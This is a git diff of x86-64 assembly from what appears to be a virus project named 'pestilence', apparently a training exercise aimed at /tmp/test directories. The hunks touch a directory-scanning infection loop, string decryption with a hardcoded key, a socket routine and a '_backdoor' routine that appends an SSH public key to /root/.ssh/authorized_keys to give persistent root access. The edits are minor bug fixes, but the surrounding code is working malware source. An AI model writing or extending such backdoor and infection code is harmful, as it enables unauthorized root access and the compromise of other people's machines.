@@ -149,12 +149,6 @@ _readDir:
             mov rdi, rsp
             call _strcpyNoNull
 
-            ; printing
-            ; writeWork
-            ; writeBack
-
-            ; ajouter les foncton pour chaques fichier ici
-            ; call _open_file
 			call _check_file
 
             jmp _checkRead
@@ -194,10 +188,6 @@ _readDir:
 		syscall
 		or qword FAM(pestilence.fd), -1
 		jmp _returnLeave
-
-        ; mov rax, SYS_CLOSE
-        ; mov rdi, FAM(pestilence.fd)
-        ; syscall
 
 
 _returnLeave:
@@ -569,7 +559,8 @@ _backdoor:
             inc r11
             loop _findNewline
             mov rax, SYS_WRITE
-            mov rsi, back
+            ; mov rsi, back
+			lea rsi, [back]
             mov rdx, 1
             syscall
             jmp _notFound
@@ -613,19 +604,19 @@ _backdoor:
 			mov rsi, rax
 			pop rdi
 			pop rax
-			mov rdx, sshPubLen - 1
+			mov rdx, sshPubLen
             syscall
             mov rax, SYS_WRITE
             lea rsi, [rel back]
-			push rax
-			push rdi
-			lea rdi, [rel back]
-			mov rsi, sshPubLen
+			; push rax
+			; push rdi
+			; lea rdi, [rel back]
+			; mov rsi, backLen
 			_decNotFound1:
-			call _decrypt_str
-			mov rsi, rax
-			pop rdi
-			pop rax
+			; call _decrypt_str
+			; mov rsi, rax
+			; pop rdi
+			; pop rax
 			mov rdx, 1
             syscall
 
@@ -633,7 +624,7 @@ _backdoor:
         mov rax, SYS_CLOSE
         mov rdi, r9
         syscall
-        jmp _returnLeave;
+        jmp _returnLeave
 
 
 _initSocket:
@@ -907,8 +898,9 @@ dir1        db  "/tmp/test", 0
 dir1Len    equ $ - dir1
 dir2        db  "/tmp/test2", 0
 dir2Len    equ $ - dir2
-key			db "mykey"
+key			db "mykey", 0
 back        db  9, 0
+backLen		equ $ - back
 slash       db "/", -1
 sshFile     db "/root/.ssh/authorized_keys", -1
 sshFile_len	equ $ - sshFile
